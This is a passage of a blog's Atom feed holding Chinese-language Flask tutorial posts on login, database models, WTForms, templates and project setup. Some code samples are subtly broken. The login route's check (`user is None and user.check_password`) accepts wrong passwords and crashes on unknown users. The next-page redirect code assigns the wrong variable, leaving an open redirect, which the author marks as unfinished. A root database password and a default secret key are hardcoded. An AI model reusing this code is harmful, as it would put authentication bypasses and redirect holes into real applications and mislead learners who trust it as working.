来获取</span><br><span class="line">        # flash(&apos;Login Request from user: &#123;&#125; and remember me: &#123;&#125;&apos;.format(form.username.data,form.remember_me.data))</span><br><span class="line">        user = User.query.filter_by(username=form.username.data).first()</span><br><span class="line">        if user is None and user.check_password(form.password.data):</span><br><span class="line">            flash(&quot;Your password or username was wrong.&quot;)</span><br><span class="line">            return redirect(url_for(&apos;login&apos;))</span><br><span class="line">        </span><br><span class="line">        login_user(user,form.remember_me.data)</span><br><span class="line">        return redirect(url_for(&apos;index&apos;))</span><br><span class="line">    </span><br><span class="line">    return render_template(&apos;login.html&apos;,form=form,title=&apos;login&apos;)</span><br></pre></td></tr></table></figure><ol start="5"><li>如何显示登录错误的信息</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">可以再script里面显示</span><br><span class="line"></span><br><span class="line">&lt;script&gt;</span><br><span class="line">    &#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">        &#123;% if messages %&#125;</span><br><span class="line">           &#123;% for message in messages %&#125;</span><br><span class="line">               alert(&quot;&#123;&#123; message &#125;&#125;&quot;)</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &#123;% endif %&#125;        </span><br><span class="line">    &#123;% endwith %&#125;</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><ol start="6"><li>访问受保护的链接重定向网址</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"># 在flask中，如果你访问受保护的链接的时候，会重定向到登录的网址，后面加上?next_page=xxxx 从哪里来的</span><br><span class="line"></span><br><span class="line">例如：</span><br><span class="line">http://127.0.0.1:5000/login?next=%2Fprofile </span><br><span class="line"></span><br><span class="line">返回默认的flash信息：</span><br><span class="line">&quot;please login to access this page&quot;</span><br><span class="line"></span><br><span class="line"># 不是很好，待改正</span><br><span class="line">next_page = request.args.get(&apos;next&apos;)</span><br><span class="line">if not next_page or url_parse(next_page).netloc != &apos;&apos;:</span><br><span class="line">    next = url_for(index)</span><br><span class="line">return redirect(next_page)</span><br></pre></td></tr></table></figure><ol start="7"><li>注册</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/register&apos;,methods=[&apos;GET&apos;,&apos;POST&apos;])</span><br><span class="line">def register():</span><br><span class="line">    form = RegisterForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        u = User(username=form.username.data,email=form.email.data)</span><br><span class="line">        u.set_password_hash(form.password.data)</span><br><span class="line">        db.session.add(u)</span><br><span class="line">        db.session.commit()</span><br><span class="line">        flash(&apos;Congratulations, You have registered the user! &apos;)</span><br><span class="line">        return redirect(url_for(&apos;login&apos;))</span><br><span class="line">    return render_template(&apos;register.html&apos;,form=form)</span><br></pre></td></tr></table></figure><ul><li>注意的点</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">class RegisterForm(FlaskForm):</span><br><span class="line">    username = StringField(&apos;Username&apos;,validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(&apos;Password&apos;,validators=[DataRequired()])</span><br><span class="line">    password2 = PasswordField(&apos;Re-enter Password&apos;,validators=[DataRequired(),EqualTo(&apos;password&apos;)])</span><br><span class="line">    email = StringField(&apos;Email&apos;,validators=[DataRequired(),Email()])</span><br><span class="line">    submit = SubmitField(&apos;Submit&apos;)</span><br><span class="line"></span><br><span class="line">    # 在这里增加validate_&lt;field&gt; 函数，等到校验的时候，也会一并执行</span><br><span class="line">    def validate_username(self,username):</span><br><span class="line">        user = User.query.filter_by(username=username.data).first()</span><br><span class="line">        if user is not None:</span><br><span class="line">            raise ValidationError(&apos;The user has exists.&apos;)</span><br><span class="line"></span><br><span class="line">    def validate_email(self,email):</span><br><span class="line">        user = User.query.filter_by(email=email.data).first()</span><br><span class="line">        if user is not None:</span><br><span class="line">            raise ValidationError(&apos;The email has exists&apos;)</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;使用flask 实现登录的功能&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;用户登录&quot;&gt;&lt;a class=&quot;m
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask - Database</title>
    <link href="http://yoursite.com/2018/06/09/Flask-Database/"/>
    <id>http://yoursite.com/2018/06/09/Flask-Database/</id>
    <published>2018-06-09T13:19:29.000Z</published>
    <updated>2018-06-09T13:21:08.181Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>简述flask中数据库的应用</p></blockquote><h1 id="flask中的数据库"><a class="markdownIt-Anchor" href="#flask中的数据库"></a> flask中的数据库</h1><ol><li>安装数据库相关依赖</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-sqlalchemy</span><br><span class="line">pip install flask-migrate</span><br><span class="line">pip install pymysql</span><br></pre></td></tr></table></figure><ol start="2"><li>数据库配置</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 添加配置文件</span><br><span class="line"># configure.py</span><br><span class="line"></span><br><span class="line"># 数据库地址</span><br><span class="line">SQLALCHEMY_DATABASE_URI = os.environ.get(&apos;SQLALCHEMY_DATABASE_URI&apos;) or &quot;mysql+pymysql://root:qwe123@127.0.0.1/microblog&quot;</span><br><span class="line"># 是否记录application每次改变的信号。没什么用</span><br><span class="line">SQLALCHEMY_TRACK_MODIFICATIONS = False</span><br></pre></td></tr></table></figure><ol start="3"><li>在初始化app文件中引入</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># __init__.py</span><br><span class="line">db = SQLAlchemy(app)</span><br><span class="line">migrate = Migrate(app,db)</span><br></pre></td></tr></table></figure><ol start="4"><li>设计并定义models</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">from microblogapp import db</span><br><span class="line">from datetime import datetime</span><br><span class="line"></span><br><span class="line">class User(db.Model):</span><br><span class="line">    __tablename__ = &apos;user&apos;</span><br><span class="line">    id = db.Column(db.Integer,primary_key=True)</span><br><span class="line">    username = db.Column(db.String(64),unique=True,index=True)</span><br><span class="line">    password_hash = db.Column(db.String(128))</span><br><span class="line">    email = db.Column(db.String(64),index=True,unique=True)</span><br><span class="line">    # 存储一个字段，相当于执行了一次查询</span><br><span class="line">    posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;)</span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;&lt;User : &#123;&#125;&gt;&quot;.format(self.username)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">class Post(db.Model):</span><br><span class="line">    __tablename__ = &apos;post&apos;</span><br><span class="line">    id = db.Column(db.Integer,primary_key=True)</span><br><span class="line">    body = db.Column(db.String(140))</span><br><span class="line">    timestamp = db.Column(db.DateTime,index=True,default=datetime.now)</span><br><span class="line">    # 外键，小写表名.id，通常采用蛇形写法： user_id</span><br><span class="line">    user_id = db.Column(db.Integer,db.ForeignKey(&apos;user.id&apos;))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    def __repr__(self):</span><br><span class="line">        return &quot;&lt;Post:&#123;&#125;&gt;&quot;.format(self.body)</span><br></pre></td></tr></table></figure><ol start="5"><li>变更数据库结构，如何更好的迁移？</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">使用flask_migrate来做迁移和记录。</span><br><span class="line">注意： </span><br><span class="line">这里我们需要再run.py,也就是指定flask app的python文件里面，指定models，要不然migrate识别不到。</span><br><span class="line"></span><br><span class="line"># run.py</span><br><span class="line">from microblogapp import models</span><br><span class="line"></span><br><span class="line"># command</span><br><span class="line">flask db init</span><br><span class="line">flask db migrate -m &quot;init db&quot;</span><br><span class="line">flask db upgrade</span><br><span class="line"></span><br><span class="line"># 如何回滚？</span><br><span class="line">flask db downgrade </span><br><span class="line"></span><br><span class="line"># 如何回滚到之前的多个版本</span><br><span class="line">flask db downgrade f37d(版本号)</span><br><span class="line"></span><br><span class="line">* 版本号存在于 migrations/versions/ 下面</span><br></pre></td></tr></table></figure><ol start="6"><li>数据库中的关系</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># 这里只暂时讲到了一对多的关系。</span><br><span class="line"># 一个人可以写多篇文章</span><br><span class="line"></span><br><span class="line">#在User里面</span><br><span class="line">posts = db.relationship(&apos;Post&apos;,backref=&apos;author&apos;,lazy=&apos;dynamic&apos;)</span><br><span class="line"></span><br><span class="line">实际上，posts不是数据库里面的一个字段，</span><br><span class="line">orm框架使用db.relationship这个函数，</span><br><span class="line">执行了查询语句,</span><br><span class="line">** 返回了关于这个User的Post对象，是一个列表</span><br><span class="line"></span><br><span class="line">u.posts =&gt; [Post1,Post2,Post3...]</span><br><span class="line"></span><br><span class="line"># 还可以进一步查询</span><br><span class="line">Post1.body</span><br><span class="line">Post1.timestamp</span><br><span class="line"></span><br><span class="line"># backref用于之处 &quot;多&quot; 的一端 指向 &quot;一&quot;的一端。</span><br><span class="line">p = Post.query.filter_by(xxx).first()</span><br><span class="line">p.author === &gt; 查出了User这个对象</span><br><span class="line"></span><br><span class="line"># 也就是说backref用于 『多』的一端 检索『一』的一端</span><br></pre></td></tr></table></figure><ol start="7"><li>数据库在flask中的查询语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"># 查询User</span><br><span class="line">u = User.query.filter_by(username=&apos;johnw&apos;).first()</span><br><span class="line"># 查询文章</span><br><span class="line">u.posts ==&gt; [Post1,Post2]</span><br><span class="line"></span><br><span class="line"># 查询文章内容</span><br><span class="line">for post in u.posts:</span><br><span class="line">    print(post.body)</span><br><span class="line"></span><br><span class="line"># 添加用户</span><br><span class="line">u = User(username=&apos;johnw&apos;)</span><br><span class="line"># 添加文章</span><br><span class="line">p = Post(body=&quot;Hello world!&quot;)</span><br><span class="line"># 指定作者</span><br><span class="line">p.author = u</span><br><span class="line"></span><br><span class="line"># 按照username降序排列</span><br><span class="line">u = User.query.order_by(User.username.desc()).all()</span><br></pre></td></tr></table></figure><ol start="8"><li>shell语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 为了更加方便我们在shell里面调试语句</span><br><span class="line">@app.shell_context_processor</span><br><span class="line">def make_shell_context():</span><br><span class="line">    return &#123;&quot;db&quot;:db,&quot;User&quot;:models.User,&quot;Post&quot;:models.Post&#125;</span><br></pre></td></tr></table></figure><h1 id="总结"><a class="markdownIt-Anchor" href="#总结"></a> 总结</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">多的一端 存个id就好了</span><br><span class="line">一的一端 需要存个relationship</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;简述flask中数据库的应用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;flask中的数据库&quot;&gt;&lt;a cla
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask - Web Form</title>
    <link href="http://yoursite.com/2018/06/09/Flask-Web-Form/"/>
    <id>http://yoursite.com/2018/06/09/Flask-Web-Form/</id>
    <published>2018-06-09T13:18:48.000Z</published>
    <updated>2018-06-09T13:19:08.985Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>简述了如何在flask中实现表单应用</p></blockquote><h1 id="flask-wtf"><a class="markdownIt-Anchor" href="#flask-wtf"></a> Flask-WTF</h1><ol><li>安装</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask_wtf</span><br></pre></td></tr></table></figure><ol start="2"><li>配置文件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 配置文件应该单独出来</span><br><span class="line"># 表单需要用到secret key 做为CSRF的防护</span><br><span class="line"></span><br><span class="line">import os </span><br><span class="line">class Configure(object):</span><br><span class="line">    SECRET_KEY = os.environ.get(&apos;SECRET_KEY&apos;) or &quot;You-never-guess&quot;</span><br><span class="line"></span><br><span class="line">#最后要在application初始化文件里面</span><br><span class="line"># 引入这个配置</span><br><span class="line"></span><br><span class="line">#__init__.py</span><br><span class="line">app.config.from_object(Configure)</span><br></pre></td></tr></table></figure><ol start="3"><li>csrf</li></ol><blockquote><p>介绍： <a href="https://zh.wikipedia.org/zh/%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0" target="_blank" rel="noopener">https://zh.wikipedia.org/zh/跨站请求伪造</a></p></blockquote><ol start="4"><li>配置文件的敏感数据</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">将配置文件中的敏感数据做为系统变量，这样可以避免敏感数据的泄露，将开发和运维分离。</span><br></pre></td></tr></table></figure><ol start="5"><li>创建登录表单</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 主要的功能导入</span><br><span class="line">from flask_wtf import FlaskForm</span><br><span class="line"># 引入字段</span><br><span class="line">from wtforms import StringField,PasswordField,SubmitField,BooleanField</span><br><span class="line"># 引入验证</span><br><span class="line">from wtforms.validators import DataRequired</span><br><span class="line"></span><br><span class="line">class LoginForm(FlaskForm):</span><br><span class="line">    username = StringField(&apos;Username&apos;,validators=[DataRequired()])</span><br><span class="line">    password = PasswordField(&apos;Password&apos;,validators=[DataRequired()])</span><br><span class="line">    remember_me = BooleanField(&apos;Remember Me&apos;)</span><br><span class="line">    submit = SubmitField(&apos;Submit&apos;)</span><br></pre></td></tr></table></figure><ol start="6"><li>html中的表单</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123; form.hidden_tag() &#125;&#125;: 藏着crsf token</span><br><span class="line">&#123;&#123; form.username(class_=&apos;username&apos;) &#125;&#125;: 括号里面可以设置class name</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 代码：</span><br><span class="line">&lt;form action=&apos;&apos; method=&apos;POST&apos;&gt;</span><br><span class="line">    &#123;&#123; form.hidden_tag() &#125;&#125;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123; form.username.label() &#125;&#125;</span><br><span class="line">        &#123;&#123; form.username(class_=&apos;username&apos;)&#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123; form.password.label() &#125;&#125;</span><br><span class="line">        &#123;&#123; form.password(class_=&apos;password&apos;)&#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;</span><br><span class="line">        &#123;&#123; form.remember_me(class_=&apos;remember_me&apos;)&#125;&#125;&#123;&#123; form.remember_me.label() &#125;&#125;</span><br><span class="line">    &lt;/p&gt;</span><br><span class="line">    &lt;p&gt;&#123;&#123; form.submit() &#125;&#125;&lt;/p&gt;</span><br><span class="line">&lt;/form&gt;</span><br></pre></td></tr></table></figure><ol start="7"><li>处理表单的路由事件</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">from microblogapp.forms import LoginForm</span><br><span class="line">@app.route(&apos;/login&apos;)</span><br><span class="line">def login():</span><br><span class="line">    form = LoginForm()</span><br><span class="line">    if form.validate_on_submit():</span><br><span class="line">        flash(&apos;Login Request from user: &#123;&#125; and remember me: &#123;&#125;&apos;.format(form.username.data,form.remember_me.data))</span><br><span class="line">        return redirect(&apos;/index&apos;)</span><br><span class="line">    </span><br><span class="line">    return render_template(&apos;login.html&apos;,form=form,title=&apos;login&apos;)</span><br></pre></td></tr></table></figure><ol start="8"><li>flash的内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;!-- 使用with 声明一个变量来接受函数的返回值 --&gt;</span><br><span class="line">&#123;% with messages = get_flashed_messages() %&#125;</span><br><span class="line">&lt;!-- 返回了一个列表 --&gt;</span><br><span class="line">    &#123;% if messages %&#125;</span><br><span class="line">        &lt;ul&gt;</span><br><span class="line">            &#123;% for message in messages %&#125;</span><br><span class="line">                &lt;li&gt;&#123;&#123; message &#125;&#125;&lt;/li&gt;</span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        &lt;/ul&gt;</span><br><span class="line">    &#123;% endif %&#125;        </span><br><span class="line">&#123;% endwith %&#125;</span><br></pre></td></tr></table></figure><ol start="9"><li>错误内容</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for error in form.username.errors %&#125;</span><br><span class="line">&lt;span style=&apos;color:red;&apos;&gt;&#123;&#123; error&#125;&#125;&lt;/span&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;简述了如何在flask中实现表单应用&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;flask-wtf&quot;&gt;&lt;a 
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask - Templates</title>
    <link href="http://yoursite.com/2018/06/09/Flask-Templates/"/>
    <id>http://yoursite.com/2018/06/09/Flask-Templates/</id>
    <published>2018-06-09T13:18:00.000Z</published>
    <updated>2018-06-09T13:18:24.772Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>这一章主要讲了一下flask中的模板的概念</p></blockquote><h1 id="什么是模板"><a class="markdownIt-Anchor" href="#什么是模板"></a> 什么是模板</h1><ol><li>创建模板文件夹</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mkdir microblogapp/templates</span><br></pre></td></tr></table></figure><ol start="2"><li>render_template 函数</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&apos;/&apos;)</span><br><span class="line">@app.route(&apos;/index&apos;)</span><br><span class="line">def index():</span><br><span class="line">    user = &#123;</span><br><span class="line">        &quot;username&quot;:&quot;jacky&quot;</span><br><span class="line">    &#125;</span><br><span class="line">    posts = [</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;author&quot;:&#123;</span><br><span class="line">                &quot;username&quot;:&quot;johnw&quot;</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;body&quot;:&quot;Hello World!!!&quot;,</span><br><span class="line">        &#125;,</span><br><span class="line">        &#123;</span><br><span class="line">            &quot;author&quot;:&#123;</span><br><span class="line">                &quot;username&quot;:&quot;Michael&quot;,</span><br><span class="line">            &#125;,</span><br><span class="line">            &quot;body&quot;:&quot;Beeeeeautiful Wrold. &quot;</span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">    </span><br><span class="line">    #顾名思义，就是渲染模板的函数。第一个参数是要渲染的html。</span><br><span class="line">    #在templates文件夹里面，接下来的一系列函数都可以在html里面用&#123;&#123;&#125;&#125;进行引用</span><br><span class="line">    return render_template(&apos;index.html&apos;,user=user,posts=posts)</span><br></pre></td></tr></table></figure><ol start="3"><li>条件语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&#123;% if title %&#125;</span><br><span class="line">    &lt;title&gt;&#123;&#123; title &#125;&#125; - microblog &lt;/title&gt;</span><br><span class="line">&#123;% else %&#125;</span><br><span class="line">    &lt;title&gt;Hello - microblog &lt;/title&gt;</span><br><span class="line">&#123;% endif %&#125;</span><br></pre></td></tr></table></figure><ol start="4"><li>循环语句</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for post in posts %&#125;</span><br><span class="line">    &lt;div&gt;&lt;p&gt;&#123;&#123; post.author.username &#125;&#125; says: &#123;&#123; post.body &#125;&#125;&lt;/p&gt;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><ol start="5"><li>模板继承</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;basic.html&quot; %&#125;</span><br><span class="line">&#123;% block main %&#125;</span><br><span class="line">    ...</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;概述&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#概述&quot;&gt;&lt;/a&gt; 概述&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;这一章主要讲了一下flask中的模板的概念&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h1 id=&quot;什么是模板&quot;&gt;&lt;a c
      
    
    </summary>
    
      <category term="python" scheme="http://yoursite.com/categories/python/"/>
    
      <category term="flask" scheme="http://yoursite.com/categories/python/flask/"/>
    
    
  </entry>
  
  <entry>
    <title>Flask - Hello World</title>
    <link href="http://yoursite.com/2018/06/09/Flask%20-%20Hello%20World/"/>
    <id>http://yoursite.com/2018/06/09/Flask - Hello World/</id>
    <published>2018-06-09T12:46:52.333Z</published>
    <updated>2018-06-09T13:16:08.883Z</updated>
    
    <content type="html"><![CDATA[<h1 id="概述"><a class="markdownIt-Anchor" href="#概述"></a> 概述</h1><blockquote><p>准备整理最近学习的一系列的flask基础教程。</p></blockquote><h1 id="hello-world"><a class="markdownIt-Anchor" href="#hello-world"></a> Hello world</h1><ol><li>安装python3</li><li>创建项目目录，激活虚拟环境，避免全局环境的污染</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">mkdir microblog</span><br><span class="line">cd microblog</span><br><span class="line">python -m venv venv</span><br><span class="line">source venv/bin/activate</span><br></pre></td></tr></table></figure><ol start="3"><li>安装flask</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install flask</span><br></pre></td></tr></table></figure><ol start="4"><li>目录结构</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">--|microblog</span><br><span class="line">---|run.py</span><br><span class="line">---|venv</span><br><span class="line">---|microblogapp</span><br><span class="line">----|__init__.py</span><br><span class="line">----|routes.py</span><br></pre></td></tr></table></figure><ol start="5"><li>初始化app</li></ol><figure 